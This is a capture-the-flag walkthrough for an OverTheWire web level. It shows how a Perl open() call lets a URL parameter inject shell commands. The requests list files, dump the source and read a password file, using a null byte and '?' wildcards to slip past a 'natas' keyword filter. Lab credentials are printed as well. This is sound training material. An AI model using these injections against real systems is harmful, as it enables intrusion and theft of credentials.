# Perl time
The webpage shows some leetspeak text:
> H3y K1dZ,
> y0 rEm3mB3rz p3Rl rit3?
> \/\/4Nn4 g0 olD5kewL? R3aD Up!

And a drop-down list; selecting an entry in the drop-down list sends the following request:
```
GET /index.pl?file=perl+underground+3 HTTP/1.1
Host: natas29.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyOTpwYzB3MFZvMEtwVEhjRXNnTWhYdTJFd1V6eVllbVBubw==
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

And the server returns a page with a perl fanzine. So the idea would be to abuse the `file` parameter to exploit a directory traversal or command injection vulnerability, and read the flag file.

# Perl open() command injection
Turns out there is no directory traversal vulnerability, however there is a command injection one. The Perl `open()` function can read or write to a pipe instead of a file, and in such case `open()` executes a system command. More info at https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html, but to read from a pipe you can do:
```
open FILE, "/sbin/ifconfig |";
while (<FILE>) {
  chomp;
  print;
}
close FILE;
```

To write to a pipe you can do:
```
open MAIL, "|/usr/sbin/sendmail shlomif\@shlomifish.org";
print MAIL "To: Shlomi Fish <shlomif\@shlomifish.org>\n";
print MAIL "From: Shlomi Fish <shlomif\@shlomifish.org>\n";
print MAIL "\n";
print MAIL "Hello there, moi!\n";
close(MAIL);
```

**Note**: note that in the latter case the command is only executed after the file descriptor is closed.

# Exploiting it
Turns out `index.pl` calls `open()`, injecting the value of the `file` request parameter in the second argument. This allows us to execute random commands, for instance:
```
GET /index.pl?file=|ls%00 HTTP/1.1
```

prints out the list of files in the current directory at the bottom of the page.

**Notes:**
- we add a null byte at the end of our crafted input. `index.pl` executes `open(FD, "$f.txt");`, where `$f` is our parameter, so we need a null byte to ignore the string ".txt". Actually I'm not entirely sure how it works, and how Perl handles null bytes in strings.
- the opposite `ls|%00` does not work, and I am not clear why.

Anyway after we list files, we can retrieve the code of `index.pl`:
```
GET /index.pl?file=|cat+index.pl%00 HTTP/1.1
```

# Bypass the security check
Once we're here, we can easily modify the previous request to retrieve `/etc/natas_webpass/natas30`, however there is a security check:
```
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```

But that can easily be bypassed by using question marks instead of some letters:
```
GET /index.pl?file=|cat+/etc/n%3ft%3fs_webpass/n%3ft%3fs30%00 HTTP/1.1
```

Password for the next level is `WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`.

